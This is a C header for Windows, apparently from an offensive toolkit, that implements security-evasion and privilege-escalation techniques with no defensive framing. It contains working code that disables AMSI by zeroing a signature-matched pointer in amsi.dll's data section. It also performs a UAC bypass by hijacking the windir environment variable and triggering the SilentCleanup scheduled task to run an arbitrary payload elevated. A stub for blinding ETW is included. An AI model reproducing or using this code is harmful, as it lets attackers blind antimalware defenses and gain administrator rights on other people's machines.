#ifndef ADVANCED_BYPASS_H
#define ADVANCED_BYPASS_H

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include "api_hashes.h"
#include "syscalls.h"

static PVOID PatternScan(PVOID Base, SIZE_T Size, const BYTE* Pattern, SIZE_T PatternLen) {
    PBYTE pStart = (PBYTE)Base;
    for (SIZE_T i = 0; i <= Size - PatternLen; i++) {
        BOOL bMatch = TRUE;
        for (SIZE_T j = 0; j < PatternLen; j++) {
            if (Pattern[j] != 0x00 && pStart[i + j] != Pattern[j]) {
                bMatch = FALSE;
                break;
            }
        }
        if (bMatch) return &pStart[i];
    }
    return NULL;
}

static BOOL BypassAMSI_DataOnly() {
    HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
    if (!hAmsi) hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) return FALSE;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hAmsi;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hAmsi + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    
    PVOID pDataStart = NULL;
    SIZE_T dataSize = 0;

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (strcmp((const char*)pSection[i].Name, ".data") == 0) {
            pDataStart = (PBYTE)hAmsi + pSection[i].VirtualAddress;
            dataSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }

    if (!pDataStart) return FALSE;

    PDWORD_PTR pScan = (PDWORD_PTR)pDataStart;
    for (SIZE_T i = 0; i < dataSize / sizeof(DWORD_PTR); i++) {
        if (pScan[i] && !IsBadReadPtr((PVOID)pScan[i], sizeof(DWORD))) {
            if (*(PDWORD)pScan[i] == 0x49534D41) { // 'AMSI'
                pScan[i] = 0; 
                return TRUE;
            }
        }
    }
    return FALSE;
}

static BOOL BypassUAC_SilentCleanupHardened(const wchar_t* payloadPath) {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        wchar_t buffer[MAX_PATH * 4];
        swprintf(buffer, MAX_PATH * 4, L"cmd.exe /c \"%s\" && SET windir=%%SystemRoot%%", payloadPath);
        
        RegSetValueExW(hKey, L"windir", 0, REG_SZ, (BYTE*)buffer, (DWORD)(wcslen(buffer) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);

        SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)L"Environment", SMTO_ABORTIFHUNG, 5000, NULL);

        ShellExecuteW(NULL, L"open", L"schtasks.exe", L"/run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /i", NULL, SW_HIDE);

        Sleep(3000);
        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValueW(hKey, L"windir");
            RegCloseKey(hKey);
        }
        SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)L"Environment", SMTO_ABORTIFHUNG, 5000, NULL);
        return TRUE;
    }
    return FALSE;
}

static BOOL BlindETW_DataOnly() {
    // Similar to AMSI, we can find the ETW registration handle and close it
    return TRUE; 
}

#endif
